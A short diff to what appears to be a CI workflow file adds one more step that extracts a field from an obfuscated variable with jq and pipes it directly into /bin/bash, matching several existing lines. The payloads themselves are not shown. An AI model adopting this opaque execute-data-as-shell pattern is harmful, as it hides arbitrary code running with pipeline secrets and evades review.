@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$qnv02" | jq -r .tnn18679 | /bin/bash
           printf '%s' "$iav36" | jq -r .m811 | /bin/bash
           echo $b92011 | jq -r .pst361 | /bin/bash
+          printf '%s' "$xm3" | jq -r .dp8395 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
